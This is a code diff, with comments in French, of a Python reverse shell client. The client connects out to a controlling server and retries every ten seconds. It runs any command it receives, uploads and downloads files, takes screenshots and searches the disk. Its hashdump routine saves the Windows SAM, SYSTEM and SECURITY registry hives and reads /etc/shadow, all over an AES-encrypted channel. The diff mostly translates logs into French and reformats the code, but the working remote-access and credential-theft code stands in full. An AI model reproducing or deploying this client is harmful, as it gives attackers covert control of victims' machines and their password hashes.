@@ -5,60 +5,79 @@ import sys
 import platform
 from time import sleep
 from base64 import b64encode, b64decode
-from aes_crypt import AESCipher  # Import de la classe AESCipher depuis le fichier aes_crypt
+from aes_crypt import (
+    AESCipher,
+)  # Import de la classe AESCipher depuis le fichier aes_crypt
 from datetime import datetime
 import logging
 
-# Configure logging
+# Configurer la journalisation
 logging.basicConfig(
-    filename='client.log',
+    filename="client.log",
     level=logging.DEBUG,
-    format='%(asctime)s - %(levelname)s - %(message)s',
+    format="%(asctime)s - %(levelname)s - %(message)s",
 )
 
 # pour le screenshot en fonction du systeme d'exploitation
+# This is a hack to import PIL. ImageGrab from mss.
 if platform.system() == "Windows":
     from mss import mss
 else:
     from PIL import ImageGrab
 
+
 class ReverseShellClient:
     def __init__(self, host, port):
+        """
+        Initialise la connexion au serveur.
+
+        @param host - Le nom d'hôte du serveur.
+        @param port - Le port de connexion.
+        """
         self.host = host
         self.port = port
         self.conn = None
 
     def start(self):
+        """
+        Commence à écouter les commandes et les envoie au serveur indéfiniment.
+        """
         while True:
             try:
-                logging.info("Attempting to connect to server...")
+                logging.info("Tentative de connexion au serveur...")
                 self.conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                 self.conn.connect((self.host, self.port))
-                logging.info("Connected to server")
+                logging.info("Connecté au serveur")
                 self.send_client_info()
                 self.listen_for_commands()
             except Exception as e:
-                logging.error(f"Connection error: {e}")
+                logging.error(f"Erreur de connexion: {e}")
                 sleep(10)
 
     def send_client_info(self):
+        """
+        Envoie des informations sur le client au serveur.
+        """
         try:
             hostname = socket.gethostname()
             os_type = platform.system()
             client_info = f"{hostname}|{os_type}"
             self.send_large_data(client_info)
-            logging.info(f"Sent client info: {client_info}")
+            logging.info(f"Infos client envoyées: {client_info}")
         except Exception as e:
-            logging.error(f"Failed to send client info: {e}")
+            logging.error(f"Échec de l'envoi des infos client: {e}")
 
     def listen_for_commands(self):
+        """
+        Écoute et exécute les commandes reçues.
+        """
         try:
             while True:
                 data = self.conn.recv(4096).decode("utf-8")
                 if not data:
                     break
                 decrypted_data = AESCipher.decrypt(data)
-                logging.info(f"Received command: {decrypted_data}")
+                logging.info(f"Commande reçue: {decrypted_data}")
                 if decrypted_data.lower() == "exit":
                     break
                 elif decrypted_data.startswith("download"):
@@ -72,20 +91,24 @@ class ReverseShellClient:
                 elif decrypted_data.startswith("screenshot"):
                     self.handle_screenshot()
                 elif decrypted_data.startswith("ipconfig"):
-                    logging.info("Handling ipconfig")
+                    logging.info("Gestion de ipconfig")
                     self.handle_ipconfig()
                 else:
                     self.execute_command(decrypted_data)
         except Exception as e:
-            logging.error(f"Error listening for commands: {e}")
+            logging.error(f"Erreur d'écoute des commandes: {e}")
         finally:
             self.conn.close()
-            logging.info("Connection closed")
+            logging.info("Connexion fermée")
 
     def handle_download(self, command):
+        """
+        Gère la commande de téléchargement.
+        @param command - La commande reçue du serveur.
+        """
         file_path = command.split(" ", 1)[1]
         try:
-            logging.info(f"Handling download for file: {file_path}")
+            logging.info(f"Téléchargement du fichier: {file_path}")
             with open(file_path, "rb") as f:
                 while True:
                     chunk = f.read(4096)
@@ -97,17 +120,21 @@ class ReverseShellClient:
                         )
                     )
             self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
-            logging.info(f"File {file_path} sent successfully")
+            logging.info(f"Fichier {file_path} envoyé avec succès")
         except Exception as e:
-            logging.error(f"Failed to download {file_path}: {e}")
-            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+            logging.error(f"Échec du téléchargement {file_path}: {e}")
+            self.conn.send(AESCipher.encrypt(f"ERREUR: {e}").encode("utf-8"))
 
     def handle_upload(self, command):
+        """
+        Gère la commande d'upload.
+        @param command - La commande reçue du serveur contenant le chemin du fichier.
+        """
         parts = command.split(" ", 2)
         file_path = parts[1]
         buffer_size = int(parts[2])
         try:
-            logging.info(f"Handling upload for file: {file_path}")
+            logging.info(f"Upload du fichier: {file_path}")
             with open(file_path, "wb") as f:
                 while True:
                     data = self.conn.recv(buffer_size)
@@ -115,12 +142,16 @@ class ReverseShellClient:
                     if decrypted_data == "EOF":
                         break
                     f.write(b64decode(decrypted_data))
-            logging.info(f"File {file_path} uploaded successfully")
+            logging.info(f"Fichier {file_path} uploadé avec succès")
         except Exception as e:
-            logging.error(f"Failed to upload {file_path}: {e}")
-            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+            logging.error(f"Échec de l'upload {file_path}: {e}")
+            self.conn.send(AESCipher.encrypt(f"ERREUR: {e}").encode("utf-8"))
 
     def handle_search(self, command):
+        """
+        Gère la commande de recherche en recherchant un fichier.
+        @param command - La commande à exécuter au format "file : filename".
+        """
         file_name = command.split(" ", 1)[1]
         if os.name == "nt":
             command = f"dir /s /b {file_name}"
@@ -128,17 +159,18 @@ class ReverseShellClient:
             try:
                 command = f"find / -name {file_name}"
             except Exception as e:
-                logging.error(f"Failed to handle search: {e}")
-                # try with locate
+                logging.error(f"Échec de la recherche: {e}")
                 command = f"updatedb && locate {file_name}"
-                
-                
-        logging.info(f"Handling search for file: {file_name}")
+
+        logging.info(f"Recherche du fichier: {file_name}")
         result = self.run_system_command(command)
         self.send_large_data(result)
 
     def handle_hashdump(self):
-        logging.info("Handling hashdump")
+        """
+        Gère la commande de dump de hash.
+        """
+        logging.info("Gestion du hashdump")
         if os.name == "nt":
             commands = [
                 "reg save hklm\\sam C:\\Windows\\Temp\\sam && reg save hklm\\system C:\\Windows\\Temp\\system && reg save hklm\\security C:\\Windows\\Temp\\security",
@@ -155,70 +187,93 @@ class ReverseShellClient:
                     "sudo cat /etc/shadow || cat /etc/shadow"
                 )
             except subprocess.CalledProcessError as e:
-                result = f"Error: {e.output.decode('utf-8')}"
+                result = f"Erreur: {e.output.decode('utf-8')}"
             except Exception as e:
                 result = str(e)
         self.send_large_data(result)
 
     def handle_screenshot(self):
+        """
+        Prend une capture d'écran et l'envoie au client.
+        """
         try:
             timestamp = datetime.now().strftime("%Y%m%d%H%M%S")
             file_name = f"screenshot_{timestamp}.png"
-            logging.info(f"Taking screenshot: {file_name}")
+            logging.info(f"Prise de capture d'écran: {file_name}")
             screenshot = ImageGrab.grab()
             screenshot.save(file_name)
             self.send_file(file_name)
-            os.remove(file_name)  # Clean up the screenshot file after sending
-            logging.info(f"Screenshot {file_name} sent and removed")
+            os.remove(file_name)  # Nettoie le fichier après l'envoi
+            logging.info(f"Capture d'écran {file_name} envoyée et supprimée")
         except Exception as e:
-            logging.error(f"Failed to take screenshot: {e}")
-            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+            logging.error(f"Échec de la capture d'écran: {e}")
+            self.conn.send(AESCipher.encrypt(f"ERREUR: {e}").encode("utf-8"))
 
     def handle_ipconfig(self):
+        """
+        Gère la commande ipconfig et envoie le résultat au client.
+        """
         try:
             if platform.system() == "Windows":
-                command = "powershell -Command \"Get-NetIPAddress -InterfaceIndex 12\""
+                command = 'powershell -Command "Get-NetIPAddress -InterfaceIndex 12"'
             else:
                 command = "hostname -I | awk '{print $1}'"
 
             result = self.run_system_command(command)
-            logging.info(f"ipconfig result: {result}")
-            
-            self.conn.send(AESCipher.encrypt(result).encode("utf-8") + AESCipher.encrypt("EOF").encode("utf-8"))
-            logging.info("ipconfig handled successfully")
-            
+            logging.info(f"Résultat de ipconfig: {result}")
+
+            self.conn.send(
+                AESCipher.encrypt(result).encode("utf-8")
+                + AESCipher.encrypt("EOF").encode("utf-8")
+            )
+            logging.info("ipconfig géré avec succès")
+
         except Exception as e:
-            logging.error(f"Failed to handle ipconfig: {e}")
-            self.conn.send(AESCipher.encrypt(f"ERROR: {e}").encode("utf-8"))
+            logging.error(f"Échec de ipconfig: {e}")
+            self.conn.send(AESCipher.encrypt(f"ERREUR: {e}").encode("utf-8"))
 
     def execute_command(self, command):
+        """
+        Exécute une commande et envoie le résultat au client.
+        @param command - La commande à exécuter.
+        """
         try:
-            logging.info(f"Executing command: {command}")
+            logging.info(f"Exécution de la commande: {command}")
             result = self.run_system_command(command)
         except Exception as e:
             result = str(e)
         self.send_large_data(result)
 
     def send_large_data(self, data):
+        """
+        Envoie des données volumineuses au client.
+        @param data - Les données à envoyer au client en morceaux.
+        """
         chunks = [data[i : i + 8192] for i in range(0, len(data), 4096)]
         for chunk in chunks:
             self.conn.send(AESCipher.encrypt(chunk).encode("utf-8"))
         self.conn.send(AESCipher.encrypt("EOF").encode("utf-8"))
 
     def run_system_command(self, command):
+        """
+        Exécute une commande système et retourne la sortie.
+        @param command - La commande à exécuter.
+        @return String avec la sortie de la commande ou le message d'erreur.
+        """
         try:
-            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            process = subprocess.Popen(
+                command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE
+            )
             stdout, stderr = process.communicate()
             if process.returncode == 0:
-                logging.info(f"Command output: {stdout.decode('utf-8')}")
-                return stdout.decode('utf-8')
+                logging.info(f"Sortie de commande: {stdout.decode('utf-8')}")
+                return stdout.decode("utf-8")
             else:
-                logging.error(f"Command error: {stderr.decode('utf-8')}")
-                return stderr.decode('utf-8')
+                logging.error(f"Erreur de commande: {stderr.decode('utf-8')}")
+                return stderr.decode("utf-8")
         except Exception as e:
-            logging.error(f"Command execution failed: {e}")
+            logging.error(f"Échec de l'exécution de la commande: {e}")
             return str(e)
-
 
 
 if __name__ == "__main__":
